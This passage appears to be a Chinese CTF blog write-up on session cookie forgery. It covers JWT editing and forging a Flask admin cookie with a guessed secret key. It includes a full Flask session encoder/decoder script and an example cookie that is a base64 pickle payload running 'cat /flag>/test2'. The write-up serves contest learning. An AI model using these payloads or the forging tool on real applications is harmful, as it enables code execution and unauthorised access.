@@ -1,0 +1,1338 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="cookie伪造类, wuk0Ng">
+    <meta name="description" content="wuk0Ng的个人博客">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>cookie伪造类 | wuk0Ng</title>
+    <link rel="icon" type="image/jpeg" href="/shaoqing.jpg">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+   <style>
+    body{
+       background-image: url(/medias/my_background.jpg);
+       background-repeat:no-repeat;
+       background-size:cover;
+       background-attachment:fixed;
+    }
+</style>
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/jiushen.jpg" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">wuk0Ng</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/jiushen.jpg" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">wuk0Ng</div>
+        <div class="logo-desc">
+            
+            wuk0Ng的个人博客
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/web-wuk0Ng" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/web-wuk0Ng" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">cookie伪造类</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%AF%94%E8%B5%9B/">
+                                <span class="chip bg-color">比赛</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E8%AE%B0%E5%BD%95/" class="post-category">
+                                记录
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2025-07-16
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="概念和使用简介"><a href="#概念和使用简介" class="headerlink" title="概念和使用简介"></a>概念和使用简介</h1><p>首先，我也是在这个pyjail的学习中慢慢加深了对这个session的理解<br>首先，我们可以去抓一个地方的包试试<br>很多时候能抓到一个</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:session=gASVKwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBBjYXQgL2ZsYWc+L3Rlc3QylIWUUpQu</span><br></pre></td></tr></table></figure>
+<p>类似这样的东西<br>就像是一个凭证，让系统知道你是谁，你的身份等等。很多时候是经过一定的加密手段进行处理的<br>比如使用到的pyjail，还有JWT等等</p>
+<h1 id="pyjail"><a href="#pyjail" class="headerlink" title="pyjail"></a>pyjail</h1><p>之前的博客有提及了，这里会再深入一点</p>
+<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><p>JSON Web Token（JSON Web 令牌）是一种跨域验证身份的方案。JWT 不加密传输的数据，但能够通 过数字签名来验证数据未被篡改<br>JWT 分为三部分，头部（Header），声明（Claims），签名（Signature），三个部分以英文句号.隔开。 JWT 的内容以 Base64URL 进行了编码。<br>比如会用某些签名算法，例如HS256（HMAC + SHA-256）,很多时候我们需要破解密钥来构造攻击代码</p>
+<h1 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h1><p>还有很多很多，我的理解目前来说肯定是远远不够的，我们来一道一道题目再慢慢看<br>多记录几个算法，脚本，用法等等</p>
+<h1 id="newstarctf-2024-pangbai过家家"><a href="#newstarctf-2024-pangbai过家家" class="headerlink" title="newstarctf 2024 pangbai过家家"></a>newstarctf 2024 pangbai过家家</h1><p>这个是我最早接触到的这类题目了<br>这里只讲关卡n的jwt的拿一关<br>这里我们主要是选择了这个jwt.io这个网址来打的。但是很多比赛时不允许连接网络的，我们这里选择下载到了本地的这个cyberchef来<br>我们这里是可以选择cyberchef来实现一个简单的构造的<br>首先我们要知道jwt的构成。拿下一关的session来说明（因为pangbai过家家的环境真的是复现不了了，我们这里选择使用下面这道题目的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJuYW1lIjoiL2ZsYWcifQ.aHYrlw.djGcGvalrdRfPImLi8C4DrRGS1o</span><br></pre></td></tr></table></figure>
+<p>先进行一次base64解码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;/flag&quot;&#125;..b¹pv1..ö¥.Ô_&lt;...À¸.´FKZ</span><br></pre></td></tr></table></figure>
+<p>前面的就是我们要改的东西了，这个直接就复制过来<br>然后在cyberchef里面选择加密的算法和密钥<br>就可以达到构造我们作用了,就将level6改为0就可以了<br>下面是jwt.io</p>
+<p><img src="https://github.com/web-wuk0Ng/my-images/blob/main/9ae5b7d7e635499493a7add5852412a9.png?raw=true"></p>
+<p>这个图片是勇师傅的，大家可以关注一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://myon6.blog.csdn.net/?type=blog</span><br></pre></td></tr></table></figure>
+<p>下面这个是我们cyberchef的做法</p>
+<p><img src="https://github.com/web-wuk0Ng/my-images/blob/main/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-07-15%20191206.png?raw=true"></p>
+<h1 id="LitCTF-2023-Flag点击就送！"><a href="#LitCTF-2023-Flag点击就送！" class="headerlink" title="[LitCTF 2023]Flag点击就送！"></a>[LitCTF 2023]Flag点击就送！</h1><p>1分<br>Cookie伪造FlaskEjs<br>题目描述</p>
+<p>大型Flag赠送活动开始啦，不过只有管理员才能拿到<br>Flag形式 NSSCTF{}<br>出题人 J1an<br>一进去有一个输入框,一看就是input的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">欢迎参加LitCTF，告诉我你的名字吧</span><br></pre></td></tr></table></figure>
+<p>剩下的什么也没有，我们来目录扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/flag</span><br><span class="line">/hello</span><br></pre></td></tr></table></figure>
+<p>上面的没有什么用<br>然后随便输入一个名字,再接下来就是我们要点击拿flag的部分了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /flag HTTP/1.1</span><br><span class="line">Host: node4.anna.nssctf.cn:28956</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.102 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://node4.anna.nssctf.cn:28956/hello</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: session=eyJuYW1lIjoiL2ZsYWcifQ.aHYrlw.djGcGvalrdRfPImLi8C4DrRGS1o</span><br><span class="line">Connection: close</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这一步抓包，他们应该就是通过这个cookie来得知我们是不是管理员权限<br>这道题目是比较简单的<br>我们也可以借助看这道题目的框架来帮我们解决问题,是一个flask的架构<br>flask架构的session是储存在客户端的，那么就需要解决session是否会被恶意篡改的问题。而flask通过一个密钥对数据进行签名来防止session被篡改的<br>每个人的脚本名称和存放位置不一样，记得更改<br>我们测试Litctf来试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# python session.py encode -s &#x27;LitCTF&#x27; -t &#x27;&#123;&quot;name&quot;:&quot;admin&quot;&#125;&#x27;</span><br><span class="line">eyJuYW1lIjoiYWRtaW4ifQ.aHY7Ag.F9I9uiRDbwJct2Yd2FWdf-NmtA8</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我把cyberchef上面的都试了一下，是不可以的（应该是python的签名算法和很多其他的常规的算法是不一样的）<br>最后放行拿到flag<br>附上脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">&quot;&quot;&quot; Flask Session Cookie Decoder/Encoder &quot;&quot;&quot;</span><br><span class="line">__author__ = &#x27;Wilson Sumanang, Alexandre ZANNI&#x27;</span><br><span class="line"> </span><br><span class="line"># standard imports</span><br><span class="line">import sys</span><br><span class="line">import zlib</span><br><span class="line">from itsdangerous import base64_decode</span><br><span class="line">import ast</span><br><span class="line"> </span><br><span class="line"># Abstract Base Classes (PEP 3119)</span><br><span class="line">if sys.version_info[0] &lt; 3: # &lt; 3.0</span><br><span class="line">    raise Exception(&#x27;Must be using at least Python 3&#x27;)</span><br><span class="line">elif sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br><span class="line">    from abc import ABCMeta, abstractmethod</span><br><span class="line">else: # &gt; 3.4</span><br><span class="line">    from abc import ABC, abstractmethod</span><br><span class="line"> </span><br><span class="line"># Lib for argument parsing</span><br><span class="line">import argparse</span><br><span class="line"> </span><br><span class="line"># external Imports</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"> </span><br><span class="line">class MockApp(object):</span><br><span class="line"> </span><br><span class="line">    def __init__(self, secret_key):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if sys.version_info[0] == 3 and sys.version_info[1] &lt; 4: # &gt;= 3.0 &amp;&amp; &lt; 3.4</span><br><span class="line">    class FSCM(metaclass=ABCMeta):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">            &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">            &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                if(secret_key==None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"> </span><br><span class="line">                    if payload.startswith(&#x27;.&#x27;):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"> </span><br><span class="line">                    data = payload.split(&quot;.&quot;)[0]</span><br><span class="line"> </span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    if compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"> </span><br><span class="line">                    return data</span><br><span class="line">                else:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                    return s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line">else: # &gt; 3.4</span><br><span class="line">    class FSCM(ABC):</span><br><span class="line">        def encode(secret_key, session_cookie_structure):</span><br><span class="line">            &quot;&quot;&quot; Encode a Flask session cookie &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                return s.dumps(session_cookie_structure)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Encoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        def decode(session_cookie_value, secret_key=None):</span><br><span class="line">            &quot;&quot;&quot; Decode a Flask cookie  &quot;&quot;&quot;</span><br><span class="line">            try:</span><br><span class="line">                if(secret_key==None):</span><br><span class="line">                    compressed = False</span><br><span class="line">                    payload = session_cookie_value</span><br><span class="line"> </span><br><span class="line">                    if payload.startswith(&#x27;.&#x27;):</span><br><span class="line">                        compressed = True</span><br><span class="line">                        payload = payload[1:]</span><br><span class="line"> </span><br><span class="line">                    data = payload.split(&quot;.&quot;)[0]</span><br><span class="line"> </span><br><span class="line">                    data = base64_decode(data)</span><br><span class="line">                    if compressed:</span><br><span class="line">                        data = zlib.decompress(data)</span><br><span class="line"> </span><br><span class="line">                    return data</span><br><span class="line">                else:</span><br><span class="line">                    app = MockApp(secret_key)</span><br><span class="line"> </span><br><span class="line">                    si = SecureCookieSessionInterface()</span><br><span class="line">                    s = si.get_signing_serializer(app)</span><br><span class="line"> </span><br><span class="line">                    return s.loads(session_cookie_value)</span><br><span class="line">            except Exception as e:</span><br><span class="line">                return &quot;[Decoding error] &#123;&#125;&quot;.format(e)</span><br><span class="line">                raise e</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    # Args are only relevant for __main__ usage</span><br><span class="line">    </span><br><span class="line">    ## Description for help</span><br><span class="line">    parser = argparse.ArgumentParser(</span><br><span class="line">                description=&#x27;Flask Session Cookie Decoder/Encoder&#x27;,</span><br><span class="line">                epilog=&quot;Author : Wilson Sumanang, Alexandre ZANNI&quot;)</span><br><span class="line"> </span><br><span class="line">    ## prepare sub commands</span><br><span class="line">    subparsers = parser.add_subparsers(help=&#x27;sub-command help&#x27;, dest=&#x27;subcommand&#x27;)</span><br><span class="line"> </span><br><span class="line">    ## create the parser for the encode command</span><br><span class="line">    parser_encode = subparsers.add_parser(&#x27;encode&#x27;, help=&#x27;encode&#x27;)</span><br><span class="line">    parser_encode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Secret key&#x27;, required=True)</span><br><span class="line">    parser_encode.add_argument(&#x27;-t&#x27;, &#x27;--cookie-structure&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Session cookie structure&#x27;, required=True)</span><br><span class="line"> </span><br><span class="line">    ## create the parser for the decode command</span><br><span class="line">    parser_decode = subparsers.add_parser(&#x27;decode&#x27;, help=&#x27;decode&#x27;)</span><br><span class="line">    parser_decode.add_argument(&#x27;-s&#x27;, &#x27;--secret-key&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Secret key&#x27;, required=False)</span><br><span class="line">    parser_decode.add_argument(&#x27;-c&#x27;, &#x27;--cookie-value&#x27;, metavar=&#x27;&lt;string&gt;&#x27;,</span><br><span class="line">                                help=&#x27;Session cookie value&#x27;, required=True)</span><br><span class="line"> </span><br><span class="line">    ## get args</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"> </span><br><span class="line">    ## find the option chosen</span><br><span class="line">    if(args.subcommand == &#x27;encode&#x27;):</span><br><span class="line">        if(args.secret_key is not None and args.cookie_structure is not None):</span><br><span class="line">            print(FSCM.encode(args.secret_key, args.cookie_structure))</span><br><span class="line">    elif(args.subcommand == &#x27;decode&#x27;):</span><br><span class="line">        if(args.secret_key is not None and args.cookie_value is not None):</span><br><span class="line">            print(FSCM.decode(args.cookie_value,args.secret_key))</span><br><span class="line">        elif(args.cookie_value is not None):</span><br><span class="line">            print(FSCM.decode(args.cookie_value))</span><br><span class="line"> </span><br><span class="line"> </span><br></pre></td></tr></table></figure>
